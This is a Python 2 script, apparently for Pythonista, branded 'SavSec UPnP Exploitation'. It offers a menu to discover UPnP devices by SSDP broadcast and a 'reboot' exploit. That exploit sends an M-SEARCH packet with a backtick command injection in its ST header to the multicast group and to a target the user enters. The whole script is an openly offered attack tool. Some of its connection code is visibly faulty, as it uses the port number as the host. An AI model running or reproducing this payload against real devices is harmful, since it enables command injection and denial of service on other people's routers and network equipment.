import socket, console, time, sys
console.set_color(1,0,0)
print """     _____ _____     _____ _____ 
    |  _  |  _  |___| __  |     |
    |     |   __|___|    -|  |  |
    |__|__|__|SavSec|__|__|_____|
       UPnP Exploitation"""
console.set_color()
time.sleep(1)
ssdpsrc = { "ip_address" : "239.255.255.250",
"port" : 1900,
"mx"   : 10,
"st"   : "ssdp:all" }

exptpack1 = """M-SEARCH * HTTP/1.1
HOST: {ip_address}:{port}
MAN: "ssdp:discover"
ST: uuid:`reboot`
MX: 2
""".replace("\n", "\r\n").format(**ssdpsrc) + "\r\n"

ssdpre = """M-SEARCH * HTTP/1.1
HOST: {ip_address}:{port}
MAN: "ssdp:discover"
MX: {mx}
ST: {st}
""".replace("\n", "\r\n").format(**ssdpsrc) + "\r\n"

def discover(match="", timeout=2):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
	s.sendto(ssdpre, (ssdpsrc["ip_address"], ssdpsrc["port"]))
	s.settimeout(timeout)
	responses = []
	print ""
	try:
		while True:
			response = s.recv(1000)
			if match in response:
				print response
				responses.append(response)
	except:
		pass
	return responses

def reboot(timeout=2):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
	s.sendto(exptpack1, (ssdpsrc["ip_address"], ssdpsrc["port"]))
	s.settimeout(timeout)
	s.settimeout(timeout)
	trg = raw_input("\nTarget: ")
	tpg = int(input("Port: "))
	for i in range(4):
		sys.stdout.write("\rSending Reboot Payload" + "." * i)
		time.sleep(0.05)
	print ""
	s.sendto(exptpack1, (trg, tpg))
	try:
		s.connect((str(tpg), int(tpg)))
		time.sleep(0.1)
		s.send(u"`REBOOT`")
		s.close()
		time.sleep(1)
		s.connect((str(tpg), int(tpg)))
	except:
		print "UPnP Device Rebooted"
	s.close()

while 1:
	location = "upnp"
	act = "\n~/" + str(location) + "$: "
	console.set_color(1,1,1)
	try:
		data = raw_input(act)
	except:
		pass
	console.set_color()
	if data == "tool" or data == "tools" or data == "t":
		while 1:
			location = "tools"
			act = "\n~/" + str(location) + "$: "
			console.set_color(1,1,1)
			try:
				data = raw_input(act)
			except:
				sys.exit()
			console.set_color()
			if data == "discover" or data == "find":
				discover()
			if data == "quit" or data == "q" or data == "exit":
				sys.exit()
			if data == "clear" or data == "cls" or data == "clr":
				console.clear()
			if data == "back" or data == "cd":
				break
			if data == "?" or data == "help":
				print ""
				console.set_font("Arial-BoldMT",16)
				print "Tool Commands: "
				console.set_font()
				time.sleep(0.3)
				print "Discover  - find: discover"
				time.sleep(0.3)
				print "Exit       - q : exit"
				time.sleep(0.3)
				print "Back      - cd : back"
				time.sleep(0.3)
				print "Clear    - cls : clear"
				time.sleep(0.3)
	if data == "exploit" or data == "exploits" or data == "e":
		while 1:
			location = "exploits"
			act = "\n~/" + str(location) + "$: "
			console.set_color(1,1,1)
			try:
				data = raw_input(act)
			except:
				sys.exit()
			console.set_color()
			if data == "reboot" or data == "boot":
				reboot()
			if data == "quit" or data == "q" or data == "exit":
				sys.exit()
			if data == "clear" or data == "cls" or data == "clr":
				console.clear()
			if data == "?" or data == "help":
				print ""
				console.set_font("Arial-BoldMT",16)
				print "Exploit Commands: "
				console.set_font()
				time.sleep(0.3)
				print "Reboot  - boot : reboot"
				time.sleep(0.3)
				print "Exit       - q : exit"
				time.sleep(0.3)
				print "Back      - cd : back"
				time.sleep(0.3)
				print "Clear    - cls : clear"
				time.sleep(0.3)
			if data == "back" or data == "cd":
				break
	if data == "exit" or data == "quit" or data == "q":
		sys.exit()
	if data == "clear" or data == "cls" or data == "clr":
		console.clear()
	if data == "help" or data == "?":
		print ""
		console.set_font("Arial-BoldMT",16)
		print "Menu Commands: "
		console.set_font()
		time.sleep(0.3)
		print "Tools     - t : tools"
		time.sleep(0.3)
		print "Exploits  - e : exploits"
		time.sleep(0.3)
		print "Exit      - q : exit"
		time.sleep(0.3)
		print "Back     - cd : back"
		time.sleep(0.3)
		print "Clear   - cls : clear"
		time.sleep(0.3)
